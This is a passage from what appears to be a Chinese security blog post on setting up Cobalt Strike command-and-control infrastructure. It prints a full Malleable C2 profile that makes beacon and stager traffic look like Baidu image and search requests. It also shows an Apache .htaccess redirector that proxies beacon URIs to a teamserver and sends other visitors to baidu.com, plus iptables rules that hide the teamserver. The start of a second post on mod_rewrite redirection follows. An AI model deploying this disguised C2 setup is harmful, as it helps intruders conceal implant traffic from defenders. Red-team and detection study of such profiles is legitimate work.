H_BDCLCKID_SF&#x3D;tRk8_KtKtCI3HnRY-P4_-tAt2qoXetJyaR38BCJvWJ5TMCojbPcP-UIXBgcPbfQuynRB_f0yXbQjShPC-tnNjRFkQM6iaJjfb65fBt5D3l02VM7Ee-t2ynLV34uHe4RMW238oq7mWITUsxA45J7cM4IseboJLfT-0bc4KKJxbnLWeIJEjj6jK4JKDNtDJ5vP; BDRCVFR[feWj1Vr5u3D]&#x3D;I67x6TjHwwYf0; delPer&#x3D;0; BD_CK_SAM&#x3D;1; COOKIE_SESSION&#x3D;18454_1_8_9_7_18_0_0_8_6_2_3_3514086_0_11_0_1599115184_1598838986_1599115173%7C9%230_1_1598838982%7C1; BD_HOME&#x3D;1; PSINO&#x3D;7; BDORZ&#x3D;B490B5EBF6F3CD402E515D22BCDA1598; BDRCVFR[dG2JNJb_ajR]&#x3D;mk3SLVN4HKm; ISSW&#x3D;1; H_PS_PSSID&#x3D;7541_32606_1421_32620_32327_31660_32115_7565_32691_26350; H_PS_645EC&#x3D;7f76DbrvJ3OSPPa0yE9HFSBygVDDoW5VRlO3pSIe%2BNw%2FIsO0qfi9%2B7kDdR5DButmXkOX&quot;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64url;</span><br><span class="line">	    parameter &quot;url&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        id &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            parameter &quot;eqid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        parameter &quot;wd&quot; &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">	header &quot;Bdpagetype&quot; &quot;3&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;text&#x2F;html&quot;;	</span><br><span class="line">	header &quot;Server&quot; &quot;BWS&#x2F;1.1&quot;;</span><br><span class="line">	header &quot;Set-Cookie&quot; &quot;BDSVRTM&#x3D;0; path&#x3D;&#x2F;&quot;;</span><br><span class="line">	header &quot;Vary&quot; &quot;Accept-Encoding&quot;;</span><br><span class="line">    header &quot;X-Ua-Compatible&quot; &quot;IE&#x3D;Edge,chrome&#x3D;1&quot;;    </span><br><span class="line">	header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        我们再看下该如何配置下载stage的请求，我们知道这个请求会下载一个200多k的一个文件我们先找找有没有下载文件的请求。我们可以去以加载百度logo伪装的流量下载stage</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908152245517.png" alt="image-20200908152245517"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">http-stager &#123;</span><br><span class="line"></span><br><span class="line">	set uri_x86 &quot;&#x2F;favicon.ico&quot;;</span><br><span class="line">	set uri_x64 &quot;&#x2F;Favicon.ico&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">	header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">	header &quot;Accept&quot; &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9&quot;;	    </span><br><span class="line">        header &quot;Sec-Fetch-Site&quot; &quot;same-origin&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;navigate&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;document&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Cookie&quot; &quot;BIDUPSID&#x3D;29E3A0F2775C00D759FDA49E071A0B78; PSTM&#x3D;1592203863; BAIDUID&#x3D;7B3B91054F6B7C69CCE98B945C800795:FG&#x3D;1; BD_UPN&#x3D;12314753; BDSFRCVID&#x3D;yi0OJeC62GgmFcJr_-UrEMX0j6W8_fcTH6aoA6yEDjKjrwuywjufEG0P_M8g0KubVI2-ogKKy2OTH9DF_2uxOjjg8UtVJeC6EG0Ptf8g0M5; H_BDCLCKID_SF&#x3D;tRk8_KtKtCI3HnRY-P4_-tAt2qoXetJyaR38BCJvWJ5TMCojbPcP-UIXBgcPbfQuynRB_f0yXbQjShPC-tnNjRFkQM6iaJjfb65fBt5D3l02VM7Ee-t2ynLV34uHe4RMW238oq7mWITUsxA45J7cM4IseboJLfT-0bc4KKJxbnLWeIJEjj6jK4JKDNtDJ5vP; BDRCVFR[feWj1Vr5u3D]&#x3D;I67x6TjHwwYf0; delPer&#x3D;0; BD_CK_SAM&#x3D;1; COOKIE_SESSION&#x3D;18454_1_8_9_7_18_0_0_8_6_2_3_3514086_0_11_0_1599115184_1598838986_1599115173%7C9%230_1_1598838982%7C1; BD_HOME&#x3D;1; PSINO&#x3D;7; BDORZ&#x3D;B490B5EBF6F3CD402E515D22BCDA1598; BDRCVFR[dG2JNJb_ajR]&#x3D;mk3SLVN4HKm; H_PS_PSSID&#x3D;7541_32606_1421_32620_32327_31660_32115_7565_32691_26350; H_PS_645EC&#x3D;7f76DbrvJ3OSPPa0yE9HFSBygVDDoW5VRlO3pSIe%2BNw%2FIsO0qfi9%2B7kDdR5DButmXkOX; BDSVRTM&#x3D;0&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">    header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;image&#x2F;x-icon&quot;;	</span><br><span class="line">	header &quot;Etag&quot; &quot;423e-55c8139094a40&quot;;</span><br><span class="line">	header &quot;Last-Modified:&quot; &quot;Fri, 27 Oct 2017 06:16:01 GMT&quot;;</span><br><span class="line">    header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">    header &quot;Vary&quot; &quot;Accept-Encoding,User-Agent&quot;;</span><br><span class="line">    header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            prepend &quot;                 @@                  (B         (         @                 @&quot;</span><br><span class="line">            print;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        配置好这些信息后我们最后再配置一下stage的混淆</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">stage &#123;</span><br><span class="line">	set userwx &quot;false&quot;;</span><br><span class="line">	set obfuscate &quot;false&quot;;</span><br><span class="line">	set image_size_x86 &quot;305000&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        好了，差不多就配置完成了，我们将这个整体用cl2int去测试一下</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908161204018.png" alt="image-20200908161204018"></p>
<p>​        这里有些警告说是header长度过长，这个可以先不用管</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908162211661.png" alt="image-20200908162211661"></p>
<p>​        加载Mallable C2 profile文件开启teamserver后，生成一个shell执行后，执行可以正常上线</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908163451703.png" alt="image-20200908163451703"></p>
<p>​        再用wireshark抓下流量看看，下载stage的流量如下</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908163619714.png" alt="image-20200908163619714"></p>
<p>​        心跳包的数据包如下</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908163659565.png" alt="image-20200908163659565"></p>
<p>​        获取回显的数据包如下</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908163806457.png" alt="image-20200908163806457"></p>
<p>​        好了，配置mallable C2 profile到此为止了，附上最终的profile文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">###Global Options###</span><br><span class="line">set sample_name &quot;baidu.profile&quot;;</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;5000&quot;;  </span><br><span class="line">set jitter    &quot;30&quot;;   </span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.83 Safari&#x2F;537.36&quot;; </span><br><span class="line"></span><br><span class="line">###SMB options###    </span><br><span class="line">set pipename &quot;ntsvcs&quot;;</span><br><span class="line">set pipename_stager &quot;ntsvc&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;cache&#x2F;global&#x2F;img&#x2F;aladdinIcon-1.0.gif&quot;;</span><br><span class="line">	client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;image&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;Keep-Alive&quot;;</span><br><span class="line">	</span><br><span class="line">        metadata &#123;</span><br><span class="line">            netbios;</span><br><span class="line">	    parameter &quot;sid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    server &#123;</span><br><span class="line">		header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">		header &quot;Cache-Control&quot; &quot;max-age&#x3D;315360000&quot;;	</span><br><span class="line">		header &quot;Content-Type&quot; &quot;image&#x2F;gif&quot;;</span><br><span class="line">		header &quot;Date&quot; &quot;Tue, 08 Sep 2020 06:29:52 GMT&quot;;</span><br><span class="line">		header &quot;Etag&quot; &quot;216-4c1c6ca3503c0&quot;;</span><br><span class="line">		header &quot;Expires&quot; &quot;216-4c1c6ca3503c0&quot;;</span><br><span class="line">		header &quot;Last-Modified&quot; &quot;Wed, 06 Jun 2012 05:10:47 GMT&quot;;</span><br><span class="line">		header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">		header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">        	netbios;</span><br><span class="line">        	prepend &quot;                 &quot;;</span><br><span class="line">	   		prepend &quot;GIF89a&quot;;</span><br><span class="line">	    	append &quot;;&quot;;</span><br><span class="line">        	print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;&#x2F;link&quot;;</span><br><span class="line">    set verb &quot;GET&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">	header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;navigate&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;document&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64url;</span><br><span class="line">	    	parameter &quot;url&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            parameter &quot;eqid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">		parameter &quot;wd&quot; &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">	header &quot;Bdpagetype&quot; &quot;3&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;text&#x2F;html&quot;;	</span><br><span class="line">	header &quot;Server&quot; &quot;BWS&#x2F;1.1&quot;;</span><br><span class="line">	header &quot;Set-Cookie&quot; &quot;BDSVRTM&#x3D;0; path&#x3D;&#x2F;&quot;;</span><br><span class="line">	header &quot;Vary&quot; &quot;Accept-Encoding&quot;;</span><br><span class="line">    header &quot;X-Ua-Compatible&quot; &quot;IE&#x3D;Edge,chrome&#x3D;1&quot;;    </span><br><span class="line">	header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-stager &#123;</span><br><span class="line"></span><br><span class="line">	set uri_x86 &quot;&#x2F;favicon.ico&quot;;</span><br><span class="line">	set uri_x64 &quot;&#x2F;Favicon.ico&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">	header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line">	header &quot;Accept-Ranges&quot; &quot;bytes&quot;;</span><br><span class="line">	header &quot;Content-Type&quot; &quot;image&#x2F;x-icon&quot;;	</span><br><span class="line">	header &quot;Etag&quot; &quot;423e-55c8139094a40&quot;;</span><br><span class="line">	header &quot;Last-Modified:&quot; &quot;Fri, 27 Oct 2017 06:16:01 GMT&quot;;</span><br><span class="line">    	header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">    	header &quot;Vary&quot; &quot;Accept-Encoding,User-Agent&quot;;</span><br><span class="line">    	header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            prepend &quot;                 @@                  (B         (         @                 @&quot;;</span><br><span class="line">            print;</span><br><span class="line">        	&#125; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stage &#123;</span><br><span class="line">	set userwx &quot;false&quot;;</span><br><span class="line">	set obfuscate &quot;false&quot;;</span><br><span class="line">	set image_size_x86 &quot;305000&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="mod-rewrite对不同流量转发"><a href="#mod-rewrite对不同流量转发" class="headerlink" title="mod_rewrite对不同流量转发"></a>mod_rewrite对不同流量转发</h3><p>​        通过上面的设置，我们已经对我们的流量进行重新设置，那么现在可以根据流量来通过.htaccess来设置流量的转发操作，.htaccess文件内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; ^&#x2F;(cache&#x2F;global&#x2F;img&#x2F;aladdinIcon-1.0.gif|link|favicon.ico|Favicon.ico)&#x2F;?$</span><br><span class="line">RewriteRule ^.*$ http:&#x2F;&#x2F;teamserver-ip:8880%&#123;REQUEST_URI&#125; [P]</span><br><span class="line">RewriteRule ^.*$ https:&#x2F;&#x2F;www.baidu.com&#x2F;? [L,R&#x3D;302]</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure>

<p>​        配置好以后我们大致进行一下测试。</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908171959301.png" alt="image-20200908171959301"></p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908172017233.png" alt="image-20200908172017233"></p>
<p>​        应该是没有什么问题，我们回到cobaltstrike，设置一个listener，host设置为前置机对应的<strong>ip</strong>，这里还需要注意前置机的web端口应该和这里的端口一致，否则是不会上线的。</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908174336222.png" alt="image-20200908174336222"></p>
<p>​        成功上线</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908174454181.png" alt="image-20200908174454181"></p>
<p>​        但我们想通过域名来进行上线，但是是无法上线的，因为profile里的域名是百度的域名，我将域名改成自己的域名再进行测试。发现是可以上线的。</p>
<p>​        因此，<strong>如果我们想用域名上线，并且给域名加上CDN，我们申请的域名必须和我们伪造的域名类似。</strong></p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908175239355.png" alt="image-20200908175239355"></p>
<h3 id="设置防火墙"><a href="#设置防火墙" class="headerlink" title="设置防火墙"></a>设置防火墙</h3><p>​        还有最后一个问题解决，我们想要保护自己的teamserver，给我们的监听端口设置规则，只能让我们的重定向服务器访问，其他的都无法访问，该怎么做。</p>
<p>​        使用iptables进行设置，仅允许特定的ip访问我们teamserver的8880端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT  -p tcp --dport 8880 -j DROP</span><br><span class="line">iptables -A INPUT -s xxx.xxx.xxx.xx -p tcp --dport 8880 -j ACCEPT</span><br><span class="line">iptables -L -n --line-number  </span><br><span class="line">iptables-save</span><br></pre></td></tr></table></figure>

<p>​        设置好以后再使用其他的主机去访问我们teamserver的8880端口已经无法访问了。</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908193828070.png" alt="image-20200908193828070"></p>
<p>​        但是我们的beacon还可以正常运行</p>
<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908194108753.png" alt="image-20200908194108753"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于Mod_Rewrite重定向cobaltstrike流量的学习总结</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-09-04 17:20:35" itemprop="dateCreated datePublished" datetime="2020-09-04T17:20:35+08:00">2020-09-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-09-08 11:11:54" itemprop="dateModified" datetime="2020-09-08T11:11:54+08:00">2020-09-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
                    <span itemprop="name">cobaltstrike</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        通过使用socat进行重定向虽然可以将我们的teamserver隐藏起来，但是我们如果想做的更好一些，对请求我们重定向主机的流量做一个区分，如果请求来自客户端则重定向到teamserver，如果请求来自其他请求则重定向到其他网站。或者在请求中设置白名单，仅仅允许来自某个特定的ip来访问。这就需要通过apache 的Mod_rewrite来实现。</p>
<h3 id="mod-rewrite入门"><a href="#mod-rewrite入门" class="headerlink" title="mod_rewrite入门"></a>mod_rewrite入门</h3><p><strong>什么是mod_rewrite？</strong></p>
<p>​        mod_rewrite是Apache的一个模块，此模块提供了一个基于正则表达式分析器的重写引擎来实时重写URL请求。它支持每个完整规则可以拥有不限数量的子规则以及附加条件规则的灵活而且强大的URL操作机制。此URL操作可以依赖于各种测试，比如服务器变量、环境变量、HTTP头、时间标记，甚至各种格式的用于匹配URL组成部分的查找数据库。 –<a href="https://my.oschina.net/u/2326780/blog/385304" target="_blank" rel="noopener">mod_rewrite模块作用介绍</a></p>
<p>​         此模块可以操作URL的所有部分(包括路径信息部分)，在服务器级的(httpd.conf)和目录级的(.htaccess)配置都有效，还可以生成最终请求字符串。此重写操作的结果可以是内部子处理，也可以是外部请求的转向，甚至还可以是内部代理处理。<strong>一般mod_rewrite默认是不启动的，这时我们需要手动启用它</strong>  –<a href="https://my.oschina.net/u/2326780/blog/385304" target="_blank" rel="noopener">mod_rewrite模块作用介绍</a></p>
<p><strong>怎么使用mod_rewrite？</strong></p>
<p>​        首先安装apache</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install httpd</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200904183349947.png" alt="image-20200904183349947"></p>
<p>​        安装好以后，查看是否开启mod_rewrite模块,在下面的路径下，我们可以看到我这里默认已经开启了这个模块。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf.modules.d&#x2F;00-base.conf</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907092649577.png" alt="image-20200907092649577"></p>
<p>​        也可以使用下面的命令检查是否开启,如果能在输出中找到rewrite_module，则说明开启成功</p>
